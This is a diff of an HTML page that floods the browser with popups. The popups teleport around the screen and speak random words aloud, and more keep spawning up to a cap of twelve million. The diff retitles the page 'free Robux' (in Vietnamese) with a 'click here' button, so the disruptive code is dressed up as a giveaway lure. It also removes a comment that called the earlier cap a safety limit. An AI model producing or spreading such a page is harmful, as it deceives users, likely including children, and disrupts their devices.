@@ -2,24 +2,26 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CHAOS GOD SPAM</title>
+<title>robux miễn phí</title>
 </head>
 
 <body style="background:black;color:red;font-family:consolas">
-<h2>👹 CHAOS GOD SPAM ENGINE</h2>
-<button onclick="start()">START CHAOS</button>
+<h2>👹 CHAOS GOD — START = 10 POPUP</h2>
+<button onclick="start()">bấm vào</button>
 
 <script>
 
 let popups=[];
-let maxPop=1200000; // giới hạn an toàn
+let maxPop=12000000;
 
 function start(){
 
-    // boss đầu tiên
-    createPopup(true);
+    // 🔥 lần đầu mở 10 popup
+    for(let i=0;i<20;i++){
+        createPopup(false);
+    }
 
-    // mỗi 10 giây spam 20 popup
+    // ⏱️ mỗi 10 giây spam 20 popup
     setInterval(()=>{
         for(let i=0;i<20;i++){
             if(popups.length<maxPop){
@@ -29,13 +31,12 @@ function start(){
     },10000);
 }
 
-function createPopup(isBoss){
+function createPopup(){
 
     let w=window.open("","",
     "width=240,height=130,left="+
     Math.random()*800+
-    ",top="+Math.random()*500+
-    ",resizable=yes");
+    ",top="+Math.random()*500);
 
     if(!w) return;
 
@@ -52,7 +53,7 @@ function createPopup(isBoss){
     font-size:18px;
     ">
 
-    ${isBoss?"👁 CHAOS BOSS":"👿 MINION"}
+    ai hỏi
 
     <script>
 
@@ -75,22 +76,16 @@ function createPopup(isBoss){
     setInterval(()=>{
         let t=words[Math.floor(Math.random()*words.length)];
         document.body.innerText=t;
-        if(Math.random()<0.6) speak(t);
-    },400);
+        if(Math.random()<0.5) speak(t);
+    },500);
 
-    // chạy random + teleport
+    // chạy random
     setInterval(()=>{
-        let nx=Math.random()*screen.availWidth;
-        let ny=Math.random()*screen.availHeight;
-        window.moveTo(nx,ny);
-    },200);
-
-    // đóng popup → sinh thêm
-    window.addEventListener("beforeunload",()=>{
-        try{
-            window.opener.postMessage("spawn","*");
-        }catch(e){}
-    });
+        window.moveTo(
+            Math.random()*screen.availWidth,
+            Math.random()*screen.availHeight
+        );
+    },220);
 
     <\/script>
 
@@ -98,18 +93,7 @@ function createPopup(isBoss){
     `);
 }
 
-window.addEventListener("message",e=>{
-    if(e.data==="spawn"){
-        for(let i=0;i<3;i++){
-            if(popups.length<maxPop){
-                createPopup(false);
-            }
-        }
-    }
-});
-
 </script>
 
 </body>
 </html>
-
